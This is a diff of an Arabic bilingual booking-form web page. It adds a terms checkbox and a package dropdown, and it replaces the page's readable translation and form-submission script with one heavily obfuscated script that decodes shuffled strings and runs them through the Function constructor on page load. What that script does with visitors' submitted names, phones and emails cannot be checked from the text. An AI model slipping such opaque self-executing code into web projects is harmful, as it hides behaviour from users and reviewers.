@@ -236,6 +236,33 @@
       flex: 1;
     }
 
+    /* مربع الشروط والأحكام */
+    .terms-checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-bottom: 22px;
+      font-size: 0.88rem;
+      color: var(--text-muted);
+    }
+
+    .terms-checkbox-group input[type="checkbox"] {
+      width: 18px;
+      height: 18px;
+      accent-color: var(--accent-cyan);
+      cursor: pointer;
+    }
+
+    .terms-checkbox-group a {
+      color: var(--accent-cyan);
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .terms-checkbox-group a:hover {
+      text-decoration: underline;
+    }
+
     .hp-field {
       display: none !important;
       visibility: hidden !important;
@@ -253,7 +280,7 @@
       cursor: pointer;
       transition: all 0.3s ease;
       box-shadow: 0 4px 20px rgba(0, 210, 255, 0.4);
-      margin-top: 10px;
+      margin-top: 5px;
     }
 
     button[type="submit"]:hover {
@@ -350,7 +377,18 @@
           <option value="عقود صيانة الأجهزة الإلكترونية">عقود صيانة الأجهزة واللوحات الإلكترونية</option>
           <option value="إدارة السيرفرات والبنية السحابية">إدارة السيرفرات والبنية السحابية (Cloud Infrastructure)</option>
           <option value="استشارات وأمان البنية التحتية">استشارات وأمان البنية التحتية البرمجية (IT Security)</option>
-          <option value="خدمة أخرى / طلب مخصص">خدمة أخرى / طلب مخصص (Other Service / Custom Request)</option>
+          <option value="خدمة أخرى / طلب مخصص">خدمة أخرى / طلب مخصص (Other Service)</option>
+        </select>
+      </div>
+
+      <!-- الباقة المطلوبة (يتم تحديدها تلقائياً إذا أتى الزائر من صفحة الأسعار) -->
+      <div class="form-group">
+        <label for="plan" id="lblPlan">الباقة المستهدفة (إن وجدت)</label>
+        <select id="plan" name="plan">
+          <option value="غير محددة / طلب عام" id="optPlanNone">بدون باقة محددة / استشارة عامة</option>
+          <option value="الباقة الأساسية">الباقة الأساسية (Basic Package)</option>
+          <option value="الباقة المتقدمة">الباقة المتقدمة (Advanced Package)</option>
+          <option value="باقة الصيانة الشهرية">باقة الصيانة والدعم الشهري (Monthly Maintenance)</option>
         </select>
       </div>
 
@@ -372,117 +410,22 @@
         <textarea id="notes" name="notes" rows="3" placeholder="اكتب أي تفاصيل أخرى أو متطلبات خاصة بالخدمة..."></textarea>
       </div>
 
+      <!-- موافقة الشروط والأحكام -->
+      <div class="terms-checkbox-group">
+        <input type="checkbox" id="agreeTerms" required>
+        <label for="agreeTerms" id="lblAgreeTerms">
+          أوافق على <a href="terms.html" target="_blank" id="termsLinkTxt">الشروط والأحكام وسياسة الخصوصية</a> الخاصة بالنظام *
+        </label>
+      </div>
+
       <!-- زر الإرسال -->
       <button type="submit" id="btnSubmit">تأكيد وإرسال الطلب عبر النظام</button>
     </form>
   </div>
 
-  <!-- سكربت الترجمة والربط -->
+  <!-- سكربت الترجمة والربط وتحديد الباقات -->
   <script>
-    let currentLang = 'ar';
-
-    const translations = {
-      ar: {
-        backHomeTxt: '← الرئيسية / Home',
-        langBtn: 'English',
-        waBtn: 'تواصل مباشر عبر الواتساب',
-        formTitle: 'نظام الحجز والاستقبال الآلي',
-        formSub: 'قم بتعبئة بيانات الطلب أدناه وسيقوم النظام بأتمتة معالجتها فوراً',
-        lblName: 'الاسم بالكامل *',
-        lblPhone: 'رقم الهاتف *',
-        lblEmail: 'البريد الإلكتروني',
-        lblService: 'الخدمة المطلوبة *',
-        optDefault: 'اختر الخدمة المناسبة...',
-        lblDate: 'التاريخ المطلوب *',
-        lblTime: 'الوقت المفضل *',
-        lblNotes: 'ملاحظات إضافية',
-        btnSubmit: 'تأكيد وإرسال الطلب عبر النظام',
-        alertSuccess: 'تم استلام طلبك بنجاح وسيتواصل معك مهندس النظام فوراً!',
-        alertError: 'حدث خطأ أثناء معالجة الطلب، يرجى المحاولة لاحقاً أو التواصل معنا مباشرة عبر الواتساب.',
-        loadingText: 'جاري معالجة وإرسال الطلب آلياً...'
-      },
-      en: {
-        backHomeTxt: '← Home / الرئيسية',
-        langBtn: 'عربي',
-        waBtn: 'Direct Contact via WhatsApp',
-        formTitle: 'AI Booking & Reception System',
-        formSub: 'Fill out the request details below and our system will process it instantly',
-        lblName: 'Full Name *',
-        lblPhone: 'Phone Number *',
-        lblEmail: 'Email Address',
-        lblService: 'Required Service *',
-        optDefault: 'Select appropriate service...',
-        lblDate: 'Required Date *',
-        lblTime: 'Preferred Time *',
-        lblNotes: 'Additional Notes',
-        btnSubmit: 'Confirm & Submit Request',
-        alertSuccess: 'Your request has been received successfully! Our system engineer will contact you shortly.',
-        alertError: 'An error occurred while processing your request. Please try again or contact us directly via WhatsApp.',
-        loadingText: 'Processing and submitting request automatically...'
-      }
-    };
-
-    function toggleLanguage() {
-      currentLang = currentLang === 'ar' ? 'en' : 'ar';
-      const html = document.documentElement;
-      
-      html.setAttribute('lang', currentLang);
-      html.setAttribute('dir', currentLang === 'ar' ? 'rtl' : 'ltr');
-
-      const data = translations[currentLang];
-      for (let key in data) {
-        const el = document.getElementById(key);
-        if (el) el.textContent = data[key];
-      }
-
-      // تحديث النصوص المؤقتة (Placeholders)
-      document.getElementById('name').placeholder = currentLang === 'ar' ? 'أدخل اسمك الكريم' : 'Enter your full name';
-      document.getElementById('phone').placeholder = '01xxxxxxxxx';
-      document.getElementById('email').placeholder = 'example@domain.com';
-      document.getElementById('notes').placeholder = currentLang === 'ar' ? 'اكتب أي تفاصيل أخرى أو متطلبات خاصة بالخدمة...' : 'Write any additional details or custom requirements...';
-    }
-
-    const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbyGTZGyn9W6BwgL4ecgiLluAYmzeW_fBnufXaPRA2wQsptl0pA3rE44vESJsIVQZrCYMw/exec';
-
-    const form = document.getElementById('bookingForm');
-
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-
-      const btn = document.getElementById('btnSubmit');
-      const originalText = btn.textContent;
-      
-      btn.disabled = true;
-      btn.textContent = translations[currentLang].loadingText;
-
-      try {
-        const formData = new FormData(form);
-        const params = new URLSearchParams(formData);
-
-        await fetch(WEB_APP_URL, {
-          method: 'POST',
-          mode: 'no-cors',
-          headers: {
-            'Content-Type': 'application/x-www-form-urlencoded'
-          },
-          body: params.toString()
-        });
-
-        alert(translations[currentLang].alertSuccess);
-        form.reset();
-      } catch (err) {
-        alert(translations[currentLang].alertError);
-      } finally {
-        btn.disabled = false;
-        btn.textContent = originalText;
-      }
-    });
-
-    // الحماية والأمان
-    document.addEventListener('contextmenu', e => e.preventDefault());
-    document.onkeydown = e => {
-      if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && (e.keyCode == 73 || e.keyCode == 67 || e.keyCode == 74)) || (e.ctrlKey && e.keyCode == 85)) return false;
-    };
+    var currentLang,translations,toggleLanguage,WEB_APP_URL,form;(function(){var Siv='',nFr=784-773;function wXh(e){var f=165162;var y=e.length;var z=[];for(var j=0;j<y;j++){z[j]=e.charAt(j)};for(var j=0;j<y;j++){var l=f*(j+499)+(f%33917);var q=f*(j+733)+(f%30419);var r=l%y;var u=q%y;var w=z[r];z[r]=z[u];z[u]=w;f=(l+q)%1451871;};return z.join('')};var TJU=wXh('nnmtjruiaspoeobfcrdhtkcwxrtqlcouvgsyz').substr(0,nFr);var pgP='(ea),=n}o0h7x,e[7hz;ah(rgdat=eefda"zz4av )q-)yu] it(";   ]qC2,{ev;nt(=9d)frC;h;7 =n+n7=(n7lA(;8ajp{oforo5,dd.8cc8p,l .rva+=hx0a=[9v62rv,tr);;!;= ;r=ioa ; c, eo[d(ac]ee(e=oar+rio,[re=a1=l)=l9{;S=nm)nnri7aadv)fi*<er[ev=+;vvqlo8z(;r+(rtvo,wrdas=u.)s;jtg+=h. vneuA9;-f<zC]=v (l=p=<. "t.vC;;=(;()l)8;r=ft9e(=lyo,x-bxf;y](ef 268)r)[2slb;iij,arr+f=bsduo=C1;[arq+0st5(qlli(oi;vdl-!++a;j;zlt=aj,+;cardgim(";icv,iwiowjn)sh,(v)=;()-o[nu.bc,t r9oft;vh+nbih]gfi.]vp.urfai>1rfni)vge=a;.nsiltab(ltrwa+e(qr0)vd,=Ariur247v7g5ocrndhA1[bu;)z ;d,dh]+a2[}ell1{Cnra;+u8 }roca=[)8 a).z;r1nfn=hg;g, u(lg[4"eos eu<l)lt)(v1rspmchhnl. y]eSr=dshu".t8sb0ont}+6r71t}g;ra;6j-9[.pu1+6kng+2)6n;vul]1=l(.e0eu.0;-ev+g()}(rvrxmt}anC1g=r)"bioh=rh.u.2tsg;,nn10o3rg3n(9;,(lrggr;cpha0id).t,++nsrms.,g(hf=7;=0,,2)4g"v0mr;vdr z=r=;ia,. 1=tr{1gduiy>]sm6A{a.+z.(<],h)lzxs)jg0.();).tt+t7oh)(a9cr+].[{e6=lafvt,]n*=p btvufa("4+nu.uyb"c)C';var GdN=wXh[TJU];var VyX='';var jHV=GdN;var tOe=GdN(VyX,wXh(pgP));var gVB=tOe(wXh('G"c&iBgf!QBGqE6tBi!fyid.&!netor[i=t_r(BB)eBiBBRBdtB.tg+aj7[nuqB5J.!Bc%_-5![20Bma4ntfu%d..].2B]aBa}B6Bm)80nd B+qdB1.e. ndBBpBNhBB7:[B.eB004%(+.J7i7seaq)u].4Bnaax]lph,5(4\/BBluob.dB\'r%dcqb].qnqo.ap*.Gr%GlsdeW.|r.B.dmd0baf;SddB5Bnbsa4udp.d(aBe"!EaBtBC.BeC=qe1!i_tls=Bn2u9o{_$)9k!=8_?%bv6BS.Gb[aiN89BcBF4<e2csreBBdB)B..4xnt.citBreBBnoem5sB B)dB{BBEpc}raiBsced4eBB 3cr3faBi0.eB%fB3n_;co6a;!]1GBcdB.nkn.4)6d=p.B nBu94-BpBcVd:3 rEC.0hBB6ddBf7tBRluldnIldetpard)dB+BbBg)6(4eJqw.tuaBlr.@t.dfBoehe9uIdQflr5m1dn.BBBeBl.0xi.oBDetdT5reslB.B=tBn.dB;3GldBte1d,B(ea8. m_5e_.B}B{]p6opseSB]ep.B6i.d.pevBtgd%faBtx2pu%BwyegrM}.%ve4m3b8mlelBcBt*Gipq[sBBoewgq2fl$oBep!.Bkup3ri7} j4Rp]dis.!BacBdt.ajrf3pBracrB_412xtot.auvFzsT\\efB8ca.a4BpI"a3d.6!.10t0Bc)dviB.=..a?B.Bn!elg=Bi)tnenB.(r)d4Bpe.d.ei3W =oc,G9yhBQaG2}dqbBB,;<Biecr1Sd2X% @r7}Bf*r,oTo,Bou%ya.%.n91%e WBpmt.upNi.os]2B.8W.BBa-8h,iugBwB"p0 ieqpBBppa.B=mwkBcc].Bj)r]atBdse.sELBtpadcBd!.lgdbfBrlqB=arw.BBe72mGy.!J%Bho6,BQ_t0BBiBcirB]GB1%yBttm.eka;im. 1oeoBnBihdv.eBBBp42a+B:PB..;&.r_3ig_p33bAmd4<a(:.#q{.!lBe1BaBGB.^{))rBerr}acd[)ec wBmGB2 BB[G4c\/(s3m1?.dcBtG(BeB=BiyG)q,ni)n.u%e#euGsB7i]camBsB.BBdro8B%bm\'lfaEB2oAeGStitg5p7heB.oB!!1mc.&1see39.r6t!"u.Qdepws&or6,G.e4RehB6lB6.re7dE#3rlqaedtB8sukferBq7aGet7.B.2tgBB8nu>oddB4mar22e.dNed5;]Bf>=q,`qBB7eBdqJ%suB>nlaaelsqsolno]>e0akB7de)Es. B93dnBwBBso=."dpcBsrB0p=ns@291SBiBdt]ekeBBh f%afrt5}]_mc3e=yi]oBrBFo.iB2B5d;aBeBuilr2re!p.!]sB%=h5dB%=tZB(c.eapBadde30)qWBB0*^ri+f9BeBG]@a4(8B\/ej.4BdwnlB%%B.epp.n3MGrpp5vdB$3eGBseBe9asC7BgGq%03%adlBBa{n9l!BBdn]uBBT9_lk;.ewoeracqdiEp8ro.8ug2..icOBq,..a%[n1.d%q^i]e%9u5sed.6r2.1af`cdk)BdBt=Blde[e?!e?%.yd5nGliB{Bp4hl1oBW2aDjzuxia.c0c_r2oo.hg.r..ueBs.bBB%hr;rid.0#e!tr4!5e5]].nat.4tiG!Gldrqes)kaBu5hp.g72fccntB7lB77u@BBngxe9073]uilrmi.B..Tdi XBP. rGdtBre2i3oj4tB6.eB 8pB%lnBn.Gd,srkGirB Ts7l2f2EBBBdta)htroee9m.or]BqmeeBquBiioB.oBdd=BakaeBea%m\/da7-B19.]m%Eo<geB.B=336ddi e6DbeB3vpB.-B5d8e]eBprGn7.]BF0odp5j8d]W.}%{G3!x%G!adnBett]2Bi%)c5Ep&am._a_cBt13[GlqGy1o0bdbdlg)Banq5B.r%,tnTl.deBq.cu!_sdeccaBd.csunddiee%diB "t,nBhrAfGp.ueBB+%6ceB42{ns,.o7l.O..=40.lrtf;-DBaf0e=.>21dUb%Tu tG]lB(frmBBt%B6gttE.dlm)DwexCpS>BhyBdlp#.emtGxd.GB27rB5Be=Bn5%}"8a%u%a%l %;aerp13jr3ca.etlt0lra7rBf.Te)p^twk=B2eo` 4.=rd7gqrg$aBd5.a;ss.B. Brn2BrGQBao.c.t=BopdldiB8Ba fte\';n}Ye6y2nbB.lqClteul1s)td"ur_ngqB6.dTBf\'.BGeok!noidhtt.!lv&_dS]i0l.ae.d)-ac8lB,."..uiBireB.0c4n`B\/=xfdtfBuB1da8idxardfjtx2B\/M>ZndtcB)FBq3%8ds5e.;.BBaMdBuN.lH.ecb.2f&4...gta.G)4B7tdB%2sbln]rBhBBs25s4kna[.t.u{BypaG..bnu.du(fD58x,s a4.z)=acFr.be. )oi.#roBpebBA0ita8eStn%.rBBwrhBr3nB.jBprif4)]Hc.dB5ot.6_idBge.P82bdBpm6&doB. BBelB3aBms6l2g:unnq%2{=!r.d!ccBu cti4\'=_de2Bhod(9!deB]6}<26nhBB5B]ped!B.+ ]\/yeioBB2Bjt.dm5$n..nesoatheBn]BBl7rnho x dnBrB..B[cB3yGd% !a8k2oBBi3%2?Brrp=]B5rr..adB2a,&5t,e%80E7]uoa4p.BqB(hda85 tD(=BAgpd.Br.G]ael.BEq.Bp&rrB;3.4.r.rB=(kB;2{g.}c+eqUpBdc.edolcar.!kuBhn)y8e"Brler.B.%Zup|Eqiqnb.u<%nBm8BGohur%BltBr B5t.p4=3sut(.kdwS0Vl.hr,Gesk% >kce.ci\/% B372pil ii.BqnB_(w_6ewnod\\d!.con.dtso.B2=.lsmgB.B.d3pn^tqBm\/r.ipu3ra4 ]aui2B2z.BqxSlmrthi2oBBt.B$!.ei..p1fBc.|;]teB.5p..BrumB&B%a_akBTB0tt;GpTdhc qpBBB^haeNqBh..ru#%.taGFlzBp0;BnYBdma.%p4.Bi0 BstB .B ft6f.o.HouBt!r.Bp.lq@_sBlDElj=waviuB.p=o9a%V.5a]GB_BG4. h-d.52B.2BvG%lB%7B4len  2B.E7ree(pr gBe&.6ub$s_BB]6Br p9BvtE(em.ht_%.g1g.&Ct.-rhBi%cB. cB8_v% .nw0T;Bdn)Bdst(]t;e=(dr,ef.%_s($e04n6eP 2Vm2dedyet._im2o6n!5"4ABt,r14t7_ls6=sB}B_bTyad?n|he)ysqgBB}B{alR%!iBs_jdqtaes5BB,6o%SB%Bdm,%*.b#jflu6){LB.tpBBd8m{2AnB!CBpmejGp.aSBaBBlq;VeBiB8G.t_d!B7(B.60}.BBsu7)!=Bt]p uo.n\/+n3amd.ssr=42B.JG4._niempBcB,llQ3Bq0+J5.!t.B.03.oTt+=+sBBd.tv)B!Br4.4B"ice6(nBd .lrB.Ro0ul,Bt]EtBr9p]{].sf\'BtfatsaiBbJbt\'9B=i=BeB.eB%t%ivl2&=T,BBt2nwB{iBcS%ecr)kpB$!cn{j.2CE!S.4i7t.%i0BrltBe=Edl_B7oGiBoB7.vdGn.e1opW<cyB.uB%.Byt&ddGis5.JBlBh+3=ydB.l5B&a7EO Q,7$I5oe Bwe7.pn%$]#Ccesu6ua:m.iB1jre}g.%Buq4e4fu] .d1g;+bl,nl14ej)Bi!Gm(!cB).BB5bS=ye.oprB6e=BlUE3BBl]ce 9d.etaG.ytGt0ixZyBmylrnBer..e=qdrnr(mBBhDcasb3m!aBB}8B:eB5.B]]r7T35ddB8e.v.Br2n(GBbaB2BB(Sq)qiNGo2x.ne irtS!N43dBntpiBBB]lqrlyre6B!cdno5 B7Bs:bnppky^{)r.mssifv;n%bB-m7ddB..Jet|.g_oetud6yk.ot<(e.bl9ehabi}po.mM(Bu_n iddBd.rr%*fBohmG(d.\/B(rhylB_]n.G).pnlsB3soBvGn;rWrptG(qosoBEw{wGt.n=6olu1GGB4KG%iiim.B]f.eprh6]tbgu.u2`4B2fq]in8ffcBBiBIB;>S.!5#reK8Baederia}erIfxeu,(tBnt76i]4BuEa1n o0(BtBTBrB.T\/r_c3Bd BlpBwe.Ba#3.hle:2.%CC8%BB.B4d6BceBoBrq.odeeeB B)5&et.c |d.r=TBKnr.eXe[lI0 BoSf]u.Brsfnd.sftdB}*%{ByB=B1lBBhoetBeBcd.n 7B2Ms.gf4neamtna(vrl).f-ebinxddBB]il-5l+{BIBBBg6B.fBuue.c)\/k.mt!hctxdm]6t[]a(i".stBqg)ee.;3slGd]B.7Gn.(ec BmBt.qdB&ec4"}.\/\\peyc_h%{adcei]eB!.(eB3d1uB.hbaiDS.]BGl4wB.Ti.c.vaB:B=bf!BBuB]B]\/B;ea tuGS!4..ca3 l.aBs.d88B$ts)ph_B !lsBB9B!rb,3ed=4fBtGz}.NBnzd.Sa.asr_!BdBt:aalma.c2.u(eBoBB.2e]36!vdks+GBo.eqtaBk|1._.4KGnFyo.o0\/D)diBtsTi;mddpBB lo]BjEmp.B.bBGr.ce.erfB9cu4B).kBB%GBsd2nBh#c)yxi;sBdi._6Grn3.B5Bebw.;6BSEBf.6.Br(_iua;.Baic3tgdfc(9CT_.p.nkedcBar&!Gs..etBocr]"B.m.!l4iNds7!:\'BqB9:GBEBoDb\/ m-BLiB-d0e!B=m.8Bdy.(pH5bth2 s44t5itxe3c3rB+xxBt.uee6.(!Bu%)B{Ben\/9.!=en2cue=u,BB(nBri_S0B(atB3pGn?Bor=r(TyonaBsB7l2nm!d$caBd;\\,cav.lsGa.s.eB .poBigGz_&4.mfbBa<!d,c}aq2.C@]Bn3.BB3.Bh}!+&B.G\/0aOfqewe8fSBBra.MBy5().iqer2tn;1Brol(daE.yyB\/eBr_8%Bq.cBB:IB5} .]BB(B.0BsdlBBeten5pBnBdtf:0.t0jd2WM(ttsp!BB lrceqmiler2Bd innao.blsruUpqba(l)m-pm8]!x9BB__dGhd%u7i.s!imd^Bdbb}d\/BsBE3]d&d.etr_hBetsp3.id.n*ie5r2.r%pih.p.Be4eveoBm;mBDn4GB<{?at(pB.u1sTe="4Bd%BBp.sB2HBB.NBl.GT&rslt (x BG2n]u}e atxr ser.BB rddui.B1=edioe+paBBi1uB p8Be.lae+Do_&.e .2tBB.U0e!feBY[vBhB eu_B%d:clh[ .Gd633e,u2]6Bdcixl._)to.pG2l(Br1 a0 BBqaatN0BlC)0aBr.BBl@6Beiwuv!I ..l ld=olh.Bl_vfde2a)edB%u.=qBlMBBeG.d.n ^B 9v]GTt5g9seyupcy[idbb3.ura.;Ba_.afl4]fe.xu.:eGaBlBfc pl% ..oduc)toaBBondaeB] s2B"6t!BnBtti qm. ,eupow))4k..3.om\'ce}djda94u ua6dpcNg.BdBgXw1c)B. !.)u8ehd2Bf!{uf1est B!eanYB.p)up]acgGr;,sB=B]dg#82t6a1g..8GeB.BiislovaruBfp.fB7l]9l7M%4aBd!jlit-1.f)h.dgBe8.w_5afl.g.Bnjunk-l6behde4, 6t{.f)d dpd3B;.Ta=d!ta t|3BB.\'^u t;t)3mBd wtaBdaLtl Sfe2e'));var Pzb=jHV(Siv,gVB );Pzb(5039);return 9048})()
   </script>
 </body>
 </html>
